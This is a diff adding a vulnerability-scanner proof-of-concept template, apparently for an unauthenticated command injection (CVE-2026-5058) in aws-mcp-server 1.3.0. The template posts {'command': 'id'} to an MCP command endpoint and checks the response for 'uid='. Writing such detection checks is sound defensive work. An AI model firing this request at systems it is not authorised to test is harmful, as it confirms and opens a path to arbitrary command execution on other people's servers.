@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "aws-mcp-server 存在命令注入漏洞（CWE-78），攻击者可通过向允许命令列表发送恶意构造的用户输入，触发服务端执行任意系统命令。该漏洞无需身份认证即可利用，影响 aws-mcp-server 1.3.0 版本。验证方式：在目标服务的命令输入字段中注入系统命令（如 id、whoami），观察响应是否返回命令执行结果，以确认漏洞存在。"
+id = "POC-AVE-2026-1189"
+name = "CVE-2026-5058 PoC"
+severity = "critical"
+tags = ["ave-2026-1189"]
+vuln_id = [
+    "CVE-2026-5058",
+    "AVE-2026-1189",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mcp/command"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"command": "id"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
